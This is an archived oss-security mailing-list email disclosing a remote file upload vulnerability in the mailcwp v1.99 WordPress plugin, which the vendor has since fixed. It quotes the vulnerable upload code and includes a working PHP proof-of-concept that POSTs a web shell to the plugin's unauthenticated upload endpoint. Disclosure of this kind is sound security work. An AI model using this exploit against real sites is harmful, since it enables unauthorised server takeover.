X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2169" "Thursday" "16" "July" "2015" "20:18:11" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<3D0C5C47-9A9D-4C95-BF08-4AE4482C637E@me.com>" "55" "[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin" nil nil nil "7" "2015071700:18:11" "[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin" (number mark "U       larry0@me.co Jul 16   55/2169  " thread-indent "\"[oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1883 invoked by uid 550); 17 Jul 2015 00:18:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1840 invoked from network); 17 Jul 2015 00:18:25 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-16_06:2015-07-16,2015-07-16,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507170001
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <3D0C5C47-9A9D-4C95-BF08-4AE4482C637E@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Thu, 16 Jul 2015 20:18:11 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
To: Open Source Security <oss-security@lists.openwall.com>

Title: Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-09
Download Site: https://wordpress.org/plugins/mailcwp/
Vendor: CadreWorks Pty Ltd
Vendor Notified: 2015-07-09 fixed in v1.110
Vendor Contact: Contact Page via WP site
Description: MailCWP, Mail Client for WordPress. A full-featured mail clien=
t plugin providing webmail access through your WordPress blog or website.
Vulnerability:
The code in mailcwp-upload.php  doesn't check that a user is authenticated =
or what type of file is being uploaded any user can upload a shell to the t=
arget wordpress server:

  2 $message_id =3D $_REQUEST["message_id"];
  3 $upload_dir =3D $_REQUEST["upload_dir"];
=2E
=2E
  8 $fileName =3D $_FILES["file"]["name"];
  9 move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_i=
d-$fileName");

Exploitation requires the attacker to guess a writeable location in the htt=
p server root.

CVEID:
OSVDB:
Exploit Code:
	=E2=80=A2 <?php
	=E2=80=A2 /*Larry W. Cashdollar @_larry0
	=E2=80=A2 Exploit for mailcwp v1.99 shell will be called 1-shell.php.
	=E2=80=A2 7/9/2015
	=E2=80=A2 */
	=E2=80=A2         $target_url =3D 'http://www.example.com/wp-content/plugi=
ns/mailcwp/mailcwp-upload.php?message_id=3D1&upload_dir=3D/usr/share/wordpr=
ess/wp-content/uploads';
	=E2=80=A2         $file_name_with_full_path =3D '/var/www/shell.php';
	=E2=80=A2=20=20
	=E2=80=A2         echo "POST to $target_url $file_name_with_full_path";
	=E2=80=A2         $post =3D array('file' =3D> 'shell.php','file'=3D>'@'.$f=
ile_name_with_full_path);
	=E2=80=A2=20=20
	=E2=80=A2         $ch =3D curl_init();
	=E2=80=A2         curl_setopt($ch, CURLOPT_URL,$target_url);
	=E2=80=A2         curl_setopt($ch, CURLOPT_POST,1);
	=E2=80=A2         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	=E2=80=A2         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	=E2=80=A2         $result=3Dcurl_exec ($ch);
	=E2=80=A2         curl_close ($ch);
	=E2=80=A2         echo "<hr>";
	=E2=80=A2         echo $result;
	=E2=80=A2         echo "<hr>";
	=E2=80=A2 ?>
	=E2=80=A2=20=20
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D138=
